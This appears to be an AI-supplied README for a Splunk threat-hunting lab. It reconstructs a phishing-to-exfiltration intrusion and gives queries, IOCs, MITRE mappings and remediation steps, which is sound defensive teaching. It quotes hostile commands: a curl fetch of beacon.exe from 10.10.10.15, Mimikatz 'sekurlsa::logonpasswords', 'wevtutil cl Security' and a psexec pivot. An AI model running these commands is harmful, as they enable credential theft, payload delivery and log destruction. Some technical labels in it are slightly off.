Here is the clean, full plaintext version of the **Investigation 23** report.

You can click the copy button in the top right corner of the block below and paste it directly into your new `README.md` file on GitHub:

```markdown
# 🛡️ Investigation 23 – Enterprise Threat Hunting Challenge

## Scenario

An analyst initiated a threat hunt following signs of an initial access vector involving an employee on host `HR-PC01` (`alex.morgan`). The adversary leveraged a malicious phishing email containing a weaponized macro document (`invoice.docm`). Upon execution, the document initiated a stealthy, encoded PowerShell stager that downloaded and launched a remote Command and Control (C2) interactive agent (`beacon.exe`) establishing outbound persistence over port 443. 

The attacker then enumerated active directory groups, migrated execution context to the Domain Controller (`DC01`), and ran Mimikatz credential-dumping routines to extract administrative plain-text credentials. Armed with privileged access, the attacker moved laterally via PsExec over to `FILESERVER01`, where financial repositories were harvested, archived using 7-Zip, exfiltrated via Background Intelligent Transfer Service (BITS), and covered up by completely purging the local Windows Security log framework.

---

## Splunk Queries Used

### Total Event Ingestion Count

```spl
index=* source="investigation23_enterprise_threat_hunting.csv"
| stats count

```

### Infrastructure Event Distribution

```spl
index=* source="investigation23_enterprise_threat_hunting.csv"
| stats count by event_id
| sort event_id

```

### Initial Foothold Triage

```spl
index=* source="investigation23_enterprise_threat_hunting.csv" severity=Critical
| table timestamp, user, hostname, process_name, command_line, description
| sort timestamp

```

### Credential Theft & Lateral Movement Analysis

```spl
index=* source="investigation23_enterprise_threat_hunting.csv" (hostname=DC01 OR process_name=mimikatz.exe)
| table timestamp, user, hostname, process_name, command_line, description
| sort timestamp

```

### Target Exfiltration & Log Tampering Follow-up

```spl
index=* source="investigation23_enterprise_threat_hunting.csv" hostname=FILESERVER01
| table timestamp, user, process_name, command_line, description
| sort timestamp

```

---

## Investigation Findings

### Total Log Volume

* 75 Captured Events

### Event ID Framework Mapping

* **Event ID 1102** – Audit Log Cleared (1 Event)
* **Event ID 4624** – Successful System Logon (9 Events)
* **Event ID 4688** – New Process Creation (64 Events)
* **Event ID 5156** – WFP Network Outbound Traffic Allowed (1 Event)

### Monitored Malicious Utilities

* `winword.exe` (Malicious Document Delivery)
* `powershell.exe` (Encoded Payload Downloader)
* `beacon.exe` (C2 Interactive Channel)
* `mimikatz.exe` (Lsass Credential Extraction)
* `psexec.exe` (Administrative Lateral Pivot Tool)
* `robocopy.exe` (Mass Data Staging Utility)
* `7z.exe` (Data Aggregation Compression)
* `bitsadmin.exe` (Egress Communication Vector)
* `wevtutil.exe` (Forensic Mitigation / Clearing)

---

# Attack Lifecycle Timeline

### Step 1: Initial Access & Phishing Delivery

At **09:15:00**, an employee opened a weaponized attachment on `HR-PC01`.

* **Target User:** `alex.morgan`
* **Utility:** `winword.exe`
* **Command Parameter:** `invoice.docm`

### Step 2: Encoded Downloader & C2 Staging

At **09:16:00**, the active document initialized an obfuscated process script to draw downstream implants:

* **Command:** `powershell -nop -w hidden -enc ...`
* **Result:** Successfully pulled payload `beacon.exe` via `curl.exe` from remote asset `10.10.10.15`. At **09:19:00**, a persistent network connection link was validated over port 443 (**Event ID 5156**).

### Step 3: Domain Enumeration & Credential Harvesting

The attacker migrated operational sessions towards domain architecture (`DC01`) to map high-level administrative credentials.

* **Enumeration:** `net group "Domain Admins" /domain` at **09:20:00**.
* **Credential Extraction:** At **09:21:00**, the attacker executed `mimikatz.exe` passing the routine **`sekurlsa::logonpasswords`** to capture plain-text administrative hashes directly out of host security memory.

### Step 4: Lateral Movement

At **09:22:00**, the attacker leveraged stolen high-privilege credentials to pivot across network zones:

* **Utility:** `psexec.exe`
* **Command:** `psexec \\FILESERVER01 cmd`

### Step 5: Target Staging & Data Exfiltration

Once attached directly to `FILESERVER01`, the attacker ran rapid acquisition scripts:

* **Data Harvesting:** `robocopy D:\Finance C:\loot` (at **09:24:00**).
* **Compression:** Staged data compressed into **`finance.7z`** using `7z.exe` at **09:25:00**.
* **Exfiltration Transfer:** Deployed `bitsadmin.exe` running a `bitsadmin transfer` command sequence to exfiltrate the archive file.

### Step 6: Anti-Forensics Log Clearance

At **09:27:00**, the attacker attempted to blind internal detection controls by clearing tracking histories on `FILESERVER01`:

* **Execution:** `wevtutil cl Security`
* **System Trapped Log (Event ID 1102):** Captured defensive execution warning at **09:28:00**: *Security log cleared*.

---

# Indicators of Compromise (IOCs)

### System Identifiers

* File Hash Tracking Target: `invoice.docm`
* Malicious Payload/Stager: `beacon.exe`
* Exfiltration Container: `finance.7z`

### Command Strings

* `powershell -nop -w hidden -enc ...`
* `curl http://10.10.10.15/beacon.exe`
* `sekurlsa::logonpasswords`
* `psexec \\FILESERVER01 cmd`
* `wevtutil cl Security`

### Infrastructure Network Links

* C2 Node Connection Endpoint: `10.10.10.15:443`

---

# MITRE ATT&CK Framework Alignments

| Phase Tactic | Technique / Sub-Technique ID | Description |
| --- | --- | --- |
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell |
| **Command & Control** | T1071.001 | Application Layer Protocol: Web Protocols (`beacon.exe`) |
| **Credential Access** | T1003.001 | OS Credential Dumping: LSASS Memory (`mimikatz`) |
| **Lateral Movement** | T1021.002 | Remote Services: SMB/Windows Admin Shares (`psexec`) |
| **Collection** | T1005 | Data from Local System (`robocopy`) |
| **Defense Evasion** | T1560.001 | Archive via Utility: 7-Zip (`7z.exe`) |
| **Exfiltration** | T1197 | Background Intelligent Transfer Service (BITS) |
| **Defense Evasion** | T1070.001 | Indicator Removal: Clear Windows Event Logs |

---

## Technical Conclusion & Action Items

The post-incident analysis confirms a multi-stage enterprise environment compromise moving rapidly from a single asset phishing vector to a full Active Directory lateral pivot and data exfiltration chain within a short window.

### Incident Remediation Action Items:

1. **Domain Trust Evacuation:** Force an active password reset cycle across all enterprise `Domain Admins` accounts. Revoke and cycle Active Directory Kerberos ticket stagers (`krbtgt`).
2. **Endpoint Isolation:** Isolate `HR-PC01`, `DC01`, and `FILESERVER01` from the active production VLAN via EDR software to facilitate deep artifact forensic imaging.
3. **Network Perimeter Egress Adjustments:** Implement rigid egress security filtering at the firewall layer to drop non-standard out-of-zone HTTP/HTTPS connections pointing towards `10.10.10.15`.
4. **Behavioral EDR Constraints:** Deploy explicit process tree restriction settings to trigger immediate isolation warnings if administrative service shells (`w3wp.exe`, `services.exe`) or productivity files (`winword.exe`) attempt to spawn child binary frameworks like `powershell.exe`, `curl.exe`, or `cmd.exe`.

```

```
